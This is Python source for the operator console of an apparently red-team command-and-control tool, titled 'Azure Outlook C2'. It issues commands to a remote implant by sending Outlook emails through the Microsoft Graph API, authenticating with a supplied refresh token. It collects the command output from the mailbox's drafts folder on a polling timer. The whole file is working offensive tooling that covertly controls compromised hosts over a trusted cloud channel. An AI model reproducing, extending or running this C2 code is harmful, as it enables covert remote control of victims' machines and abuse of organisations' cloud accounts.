import sys, requests, re
from PyQt6 import QtCore, QtGui, QtWidgets
from colorama import (Fore as F, Back as B, Style as S)
from colors import TextColors
from StartDialog import StartDialogUI

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

BR, FT, FR, FG, FY, FB, FM, FC, ST, SD, SB = B.RED, F.RESET, F.RED, F.GREEN, F.YELLOW, F.BLUE, F.MAGENTA, F.CYAN, S.RESET_ALL, S.DIM, S.BRIGHT


def bullet(char, color):
    C = FB if color == 'B' else FR if color == 'R' else FG
    return SB + C + '[' + ST + SB + char + SB + C + ']' + ST + ' '


info, err, ok = bullet('-', 'B'), bullet('!', 'R'), bullet('+', 'G')

class mainWidget(QtWidgets.QWidget):
    def __init__(self, parent):
        super().__init__(parent)
        self.setupUI()

    def setupUI(self):
        self.resize(980, 565)

        # Create the grid for the layout. We will put things in here to display
        self.gridLayout = QtWidgets.QGridLayout(self)
        self.gridLayout.setObjectName(u"gridLayout")
        self.gridLayout.setVerticalSpacing(4)
        self.gridLayout.setContentsMargins(0, 0, 0, 5)

        # Label for displaying text like status
        self.label = QtWidgets.QLabel(self)
        self.label.setObjectName(u"label")
        self.label.setStyleSheet("margin: 2px")
        # Add the Label to our Grid that we will display
        self.gridLayout.addWidget(self.label, 3, 0, 1, 1)

        # LineEdit to take in user input
        self.lineEdit = QtWidgets.QLineEdit(self)
        self.lineEdit.setStyleSheet("margin-right: 4px; padding: 5px;")
        # Add the LineEdit to our Grid
        self.gridLayout.addWidget(self.lineEdit, 3, 1, 1, 1)

        # get input from lineEdit and send it to parse and echo to Console
        self.lineEdit.returnPressed.connect(self.onLineEditEnter)

        # Big textbox to show output to the user
        # self.textEdit = QtWidgets.QTextEdit(self)
        self.textEdit = QtWidgets.QTextEdit(self)
        self.textEdit.setReadOnly(True)
        self.textEdit.setStyleSheet("background: #282a36; ")

        self.textEdit.setContextMenuPolicy(QtCore.Qt.ContextMenuPolicy.ActionsContextMenu)

        contextMenu = QtWidgets.QMenu(self)
        clear = contextMenu.addAction("Clear")
        # connect the clear action. if triggers executes a lambda function to clear the the textEdit Console
        clear.triggered.connect(lambda x: self.textEdit.clear())

        # adding clear action to Menu
        self.textEdit.addAction(clear)

        # Add the textbox to our Grid
        self.gridLayout.addWidget(self.textEdit, 0, 0, 1, 2)

        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)

    def retranslateUi(self):
        self.label.setText(QtCore.QCoreApplication.translate("Form", u">>>", None))

    def echoCommand(self):
        text = self.lineEdit.text()
        print(f"text :{text}")
        if text == '':
            return

        self.textEdit.append(f"{TextColors.Pink('<br>Agent >')} {text}")

    def parseCommand(self):
        command = self.lineEdit.text()
        command = command.split(" ")
        metaCommand = command.pop(0)  # remove the first word from the command array and save as the metacommand
        subCommand = ' '.join(map(str, command))  # Convert the command array back into a string. Returns the subcommand
        # self.textEdit.append("  {} {}".format("MetaCommand:",metaCommand))
        # self.textEdit.append("  {} {}".format("SubCommand: ",subCommand))
        if metaCommand == "help":
            self.helpMenu()
        if metaCommand == "cmd":
            self.sendCommand(subCommand)
        if metaCommand == "nap":
            self.changeNapTime(subCommand)
        if metaCommand == "clear":
            self.textEdit.clear()

    def helpMenu(self):
        r1 = "{0:<8s} -   {1}".format("help", "This help menu.")
        r2 = "{0:<8s}-   {1}".format("cmd", "Execute a command.")
        r3 = "{0:<8s} -   {1}".format("nap", "Time between C2 communications.")
        r4 = "{0:<8s} -   {1}".format("clear", "Clear output from display.")
        menu = "{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4)
        self.textEdit.append(TextColors.Blue(menu))

    def changeNapTime(self, t):
        try:
            regex = '^[0-9]{4,20}$'
            if re.match(regex, t):
                status = "Changing nap time to {} seconds".format(int(t) / 1000)
            else:
                status = "[!] Error! Nap time must be >1000 (milliseconds)"
            timer.setInterval(int(t))
            self.textEdit.setTextColor(QtGui.QColor('#4367FF'))  # Blue
            self.textEdit.append(TextColors.Blue(status))
        except:
            print("[!] Failed to change nap time")

    def clearCommandInput(self):
        self.lineEdit.setText("")

    def onLineEditEnter(self):
        print("[^] Called onLineEdit")
        self.echoCommand()
        self.parseCommand()
        self.clearCommandInput()

    # Event handlers
    def getOutput(self):
        # This global variable persists across the GET requests and makes sure not to duplicate output
        global lastOutput
        try:
            lastOutput
        except:
            lastOutput = ""
            global init
            init = 0
            print("lastOutput:{}, init:{}".format(lastOutput, init))
        site = token.resource
        url = "{}/v1.0/me/MailFolders/drafts/messages".format(site)
        # The agent sends the command output and then a blank draft. Cmd output is second newest draft
        params = {"select": "body", "top": "2"}
        headers = {"Authorization": "Bearer {}".format(token.access)}
        try:
            print("sending request to get output")
            # response = session.get(url=url, headers=headers, params=params, verify=False, proxies=proxies)
            response = session.get(url=url, headers=headers, params=params, verify=False)
            if response.status_code == 200:
                output = response.json()['value'][0]['body']['content']

                # If blank then previous is the command output
                if output == "":
                    # Get the command output
                    output = response.json()['value'][1]['body']['content']
                print("lastOutput: {}".format(lastOutput))
                # If theres a \n at the end delete it so we dont get an extra null line in the GUI
                if re.search(r'[\r\n]{1,2}$', output):
                    output = re.sub(r'\n$', '', output)
                    output = re.sub(r'\r$', '', output)
                if output == lastOutput:
                    return
                lastOutput = output
                # If the last output starts with "cmd " its our command - dont echo it
                if re.search(r'^cmd ', output):
                    return
                if init == 0:
                    init = 1
                    print("init:{}".format(init))
                    return
                print("init:{}".format(init))
                # self.textEdit.setTextColor(QtGui.QColor('#FF2600'))  # Red
                self.textEdit.append(output)
            else:
                return
        except:
            return

    def sendCommand(self, command):
        site = token.resource
        url = "{}/v1.0/me/messages".format(site)
        headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer {}".format(token.access)
        }
        data = {
            "subject": "Azure Outlook Command & Control",
            "importance": "High",
            "body": {
                "contentType": "TEXT",
                "content": "cmd {}".format(command)
            },
            "toRecipients": [
                {"emailAddress": {"address": "Bobby.Cooke@0xBoku.com"}}
            ]
        }
        try:
            # response = session.post(url=url, headers=headers, json=data, verify=False, proxies=proxies)
            response = session.post(url=url, headers=headers, json=data, verify=False)
        except:
            return


class GuiMainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.setStyleSheet("background: #44475a;color: #f8f8f2;")

    def initUI(self):
        self.resize(980, 565)
        self.ChangeWindowTitle("Azure Outlook C2")
        self.mainWidget = mainWidget(self)
        self.setCentralWidget(self.mainWidget)
        self.show()

    def ChangeWindowTitle(self, windowTitle):
        self.setWindowTitle(QtCore.QCoreApplication.translate("Form", windowTitle, None))

    def keyPressEvent(self, event):
        key = event.key()
        # If Esc key is pressed, then exit the program
        if key == QtCore.Qt.Key.Key_Escape.value:
            self.close()


def getMsGraphAccessToken(Token):
    siteName = "https://login.microsoftonline.com"
    path = "/{}/oauth2/token?api-version=1.0".format(Token.tenantId)
    url = siteName + path
    params = {"resource": Token.resource,
              "client_id": Token.clientId,
              "grant_type": Token.grantType,
              "refresh_token": Token.refresh,
              "scope": Token.scope
              }
    try:
        # response = requests.post(url=url, data=params, verify=False, timeout=50, proxies=proxies)
        response = requests.post(url=url, data=params, verify=False, timeout=50)
        Token.access = response.json()['access_token']
    except requests.exceptions.HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
        return str(http_err)
    except Exception as err:
        print(f'Other error occurred: {err}')
        return str(err)
    return None


if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)

    startDialogWindow = StartDialogUI(QtWidgets.QDialog())
    ok = startDialogWindow.StartWindow()
    if ok:
        print(ok)
        session = requests.Session()
        token = startDialogWindow.GetTokenInfo()

        if len(token.refresh) == 0:
            critbox = QtWidgets.QMessageBox()
            critbox.setWindowTitle("Error")
            critbox.setText("No Refresh Token set")
            critbox.setIcon(QtWidgets.QMessageBox.Icon.Critical)
            critbox.setStandardButtons(
                QtWidgets.QMessageBox.StandardButton.Ok | QtWidgets.QMessageBox.StandardButton.Cancel)
            critbox.exec()
            sys.exit(1)

        napTime = 5000
        errToken = getMsGraphAccessToken(token)

        #if errToken is not None:
        #    critbox = QtWidgets.QMessageBox()
        #    critbox.setWindowTitle("Error")
        ##    critbox.setText(errToken)
        #    critbox.setIcon(QtWidgets.QMessageBox.Icon.Critical)
        #    critbox.setStandardButtons(
        #        QtWidgets.QMessageBox.StandardButton.Ok | QtWidgets.QMessageBox.StandardButton.Cancel)
        #    critbox.exec()
        #    sys.exit(1)

        ex = GuiMainWindow()
        # Qt Signals (GUI to Server communications)
        # Poll the server for new messages from the agent
        timer = QtCore.QTimer()
        timer.timeout.connect(lambda: ex.mainWidget.getOutput())
        timer.start(napTime)
        sys.exit(app.exec())
